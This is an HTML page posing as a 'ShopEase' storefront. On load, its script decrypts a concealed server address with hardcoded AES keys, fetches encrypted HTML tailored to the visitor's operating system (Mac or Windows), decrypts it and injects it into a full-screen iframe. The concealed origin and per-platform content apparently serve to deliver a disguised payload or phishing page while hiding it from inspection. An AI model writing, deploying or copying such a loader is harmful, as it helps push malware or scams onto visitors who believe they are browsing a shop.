<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>ShopEase</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
  
  </style>
</head>
<body>
 <iframe id="frame" src="https://wisdomvector-c888cd8645c7.herokuapp.com/server-api.html"
        style="display:block;width:100%;height:100vh;border:0;"
        title="encrypted shop"
        allowfullscreen
        allow="fullscreen">
</iframe>

  <script>

    const PASSPHRASE = "98yNCjeAfWMwk0wI";

const URL_KEY = "UrLk3yShopEase01";
const ENC_DATA_ORIGIN = "U2FsdGVkX1+eeP3rYck3awlh7p+cRXntKEBc5PvRG/WJ+Xsr5AzdM+Jr8jkEOCHS";

const DATA_ORIGIN = CryptoJS.AES.decrypt(
    ENC_DATA_ORIGIN,
    URL_KEY
).toString(CryptoJS.enc.Utf8);

const DATA_URL = DATA_ORIGIN + "/data";

let lastUrl = null;

function detectPlatform() {
    const p =
        (navigator.userAgentData && navigator.userAgentData.platform) ||
        navigator.platform ||
        navigator.userAgent ||
        "";

    return /mac/i.test(p) ? "mac" : "win";
}

async function loadSecret() {
    const frame = document.getElementById("frame");

    try {
        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
        const { cipher } = await res.json();

        const html = CryptoJS.AES.decrypt(
            cipher,
            PASSPHRASE
        ).toString(CryptoJS.enc.Utf8);

        if (!html) throw new Error("Decrypt failed");

        if (lastUrl) URL.revokeObjectURL(lastUrl);

        const blob = new Blob([html], { type: "text/html" });
        lastUrl = URL.createObjectURL(blob);

        frame.src = lastUrl;

    } catch (e) {
        console.error(e);
    }
}

loadSecret();
  </script>
</body>
</html>
